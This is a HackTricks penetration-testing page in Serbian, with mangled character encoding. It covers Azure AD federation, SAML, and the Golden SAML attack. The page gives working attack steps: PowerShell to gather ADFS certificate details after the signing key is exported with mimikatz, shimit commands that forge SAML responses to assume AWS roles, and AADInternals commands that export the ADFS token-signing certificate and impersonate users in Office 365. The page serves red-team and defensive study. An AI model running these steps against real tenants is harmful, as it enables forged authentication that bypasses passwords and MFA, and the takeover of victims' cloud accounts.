# Az - Federacija

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

[Od dokumenata:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federacija** je skup **domena** koji su uspostavili **poverenje**. Nivo poverenja moÅ¾e varirati, ali obiÄno ukljuÄuje **autentifikaciju** i gotovo uvek ukljuÄuje **autorizaciju**. TipiÄna federacija moÅ¾e ukljuÄivati **broj organizacija** koje su uspostavile **poverenje** za **deljeni pristup** skupu resursa.

MoÅ¾ete **federisati vaÅ¡e on-premises** okruÅ¾enje **sa Azure AD** i koristiti ovu federaciju za autentifikaciju i autorizaciju. Ovaj naÄin prijave osigurava da se sva autentifikacija korisnika **odvija on-premises**. Ovaj metod omoguÄ‡ava administratorima da implementiraju rigoroznije nivoe kontrole pristupa. Federacija sa **AD FS** i PingFederate je dostupna.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

U osnovi, u Federaciji, sva **autentifikacija** se odvija u **on-prem** okruÅ¾enju i korisnik doÅ¾ivljava SSO (Single Sign-On) preko svih poverenih okruÅ¾enja. Stoga, korisnici mogu **pristupiti** **cloud** aplikacijama koristeÄ‡i svoje **on-prem kredencijale**.

**Security Assertion Markup Language (SAML)** se koristi za **razmenu** svih informacija o autentifikaciji i autorizaciji izmeÄ‘u provajdera.

U svakoj federaciji postoje tri strane:

* Korisnik ili Klijent
* Provajder identiteta (IdP)
* Provajder usluga (SP)

(Slike preuzete sa https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. Prvo, aplikacija (Provajder usluga ili SP, kao Å¡to su AWS konzola ili vSphere web klijent) se pristupa od strane korisnika. Ovaj korak moÅ¾e biti zaobiÄ‘en, vodeÄ‡i klijenta direktno ka IdP (Provajder identiteta) u zavisnosti od specifiÄne implementacije.
2. Zatim, SP identifikuje odgovarajuÄ‡i IdP (npr. AD FS, Okta) za autentifikaciju korisnika. Zatim kreira SAML (Security Assertion Markup Language) AuthnRequest i preusmerava klijenta ka izabranom IdP.
3. IdP preuzima kontrolu, autentifikuje korisnika. Nakon autentifikacije, SAMLResponse se formira od strane IdP-a i prosleÄ‘uje SP-u preko korisnika.
4. Na kraju, SP procenjuje SAMLResponse. Ako je uspeÅ¡no validiran, implicirajuÄ‡i poverenje sa IdP-om, korisniku se odobrava pristup. Ovo oznaÄava zavrÅ¡etak procesa prijave, omoguÄ‡avajuÄ‡i korisniku da koristi uslugu.

**Ako Å¾elite da saznate viÅ¡e o SAML autentifikaciji i uobiÄajenim napadima idite na:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS je model identiteta zasnovan na tvrdnjama.
* "..tvrdnjesuprostoizjave(naprimer,ime,identitet,grupa), napravljene o korisnicima, koje se koriste preteÅ¾no za autorizaciju pristupa aplikacijama zasnovanim na tvrdnjama, smeÅ¡tenim bilo gde na Internetu."
* Tvrdnje za korisnika su napisane unutar SAML tokena i zatim potpisane radi obezbeÄ‘ivanja poverljivosti od strane IdP-a.
* Korisnik je identifikovan pomoÄ‡u ImmutableID. To je globalno jedinstveno i Äuva se u Azure AD.
* ImmutableID je Äuvan na-prem kao ms-DS-ConsistencyGuid za korisnika i/ili se moÅ¾e izvesti iz GUID-a korisnika.
* ViÅ¡e informacija na [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML napad:**

* U ADFS-u, SAML Response je potpisan sertifikatom za potpisivanje tokena.
* Ako je sertifikat kompromitovan, moguÄ‡e je autentifikovati se na Azure AD kao BILO koji korisnik sinhronizovan sa Azure AD!
* Kao i kod zloupotrebe PTA, promena lozinke za korisnika ili MFA neÄ‡e imati nikakav efekat jer laÅ¾iramo odgovor za autentifikaciju.
* Sertifikat se moÅ¾e izvuÄ‡i sa AD FS servera sa DA privilegijama i zatim se moÅ¾e koristiti sa bilo koje maÅ¡ine povezane na internet.
* ViÅ¡e informacija na [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Proces gde **Provajder identiteta (IdP)** proizvodi **SAMLResponse** za autorizaciju prijave korisnika je kljuÄan. U zavisnosti od specifiÄne implementacije IdP-a, **odgovor** moÅ¾e biti **potpisan** ili **Å¡ifrovan** koriÅ¡Ä‡enjem **privatnog kljuÄa** IdP-a. Ovaj postupak omoguÄ‡ava **Provajderu usluga (SP)** da potvrdi autentiÄnost SAMLResponse-a, osiguravajuÄ‡i da je zaista izdat od strane poverenog IdP-a.

Paralela se moÅ¾e povuÄ‡i sa [napadom zlatnim tiketom](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), gde kljuÄ koji autentifikuje korisnikov identitet i dozvole (KRBTGT za zlatne tikete, privatni kljuÄ za potpisivanje tokena za zlatni SAML) moÅ¾e biti manipulisan da **falsifikuje autentifikacioni objekat** (TGT ili SAMLResponse). Ovo omoguÄ‡ava impersonaciju bilo kog korisnika, dajuÄ‡i neovlaÅ¡Ä‡en pristup SP-u.

Golden SAML-ovi nude odreÄ‘ene prednosti:

* Mogu se **kreirati na daljinu**, bez potrebe da budu deo domena ili federacije u pitanju.
* Ostaju efikasni Äak i sa **Dvostrukom Autentifikacijom (2FA)** omoguÄ‡enom.
* **Privatni kljuÄ za potpisivanje tokena se ne obnavlja automatski**.
* **Promena lozinke korisnika ne poniÅ¡tava** veÄ‡ generisan SAML.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) je Microsoft servis koji olakÅ¡ava **sigurnu razmenu informacija o identitetu** izmeÄ‘u poverenih poslovnih partnera (federacija). U osnovi omoguÄ‡ava domenskoj usluzi da deli korisniÄke identitete sa drugim provajderima usluga unutar federacije.

Sa AWS-om koji veruje kompromitovanom domenu (u federaciji), ovu ranjivost je moguÄ‡e iskoristiti da se potencijalno **dobiju bilo koje dozvole u AWS okruÅ¾enju**. Napad zahteva **privatni kljuÄ koriÅ¡Ä‡en za potpisivanje SAML objekata**, sliÄno kao Å¡to je potrebno KRBTGT-u u napadu zlatnim tiketom. Pristup korisniÄkom nalogu AD FS-a je dovoljan da se dobije ovaj privatni kljuÄ.

Za izvoÄ‘enje golden SAML napada potrebno je:

* **Privatni kljuÄ za potpisivanje tokena**
* **Javni sertifikat IdP-a**
* **Ime IdP-a**
* **Ime uloge (uloga za preuzimanje)**
* Domain\korisniÄko ime
* Ime sesije uloge u AWS-u
* ID Amazon naloga

_Samo stavke podebljane su obavezne. Ostale se mogu popuniti po Å¾elji._

Za dobijanje **privatnog kljuÄa**, potreban je pristup **korisniÄkom nalogu AD FS-a**. Zatim, privatni kljuÄ se moÅ¾e **izvesti iz liÄnog skladiÅ¡ta** koristeÄ‡i alate poput [mimikatz](https://github.com/gentilkiwi/mimikatz). Za prikupljanje ostalih potrebnih informacija, moÅ¾ete koristiti Microsoft.Adfs.Powershell snapin na sledeÄ‡i naÄin, obezbeÄ‘ujuÄ‡i da ste prijavljeni kao korisnik ADFS-a:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Sa svim informacijama, moguÄ‡e je zaboraviti validan SAMLResponse kao korisnik kog Å¾elite da predstavljate koristeÄ‡i [**shimit**](https://github.com/cyberark/shimit)**:**
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### Lokalno -> oblak
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
TakoÄ‘e je moguÄ‡e kreirati ImmutableID korisnika samo u oblaku i impersonirati ih
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Reference

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
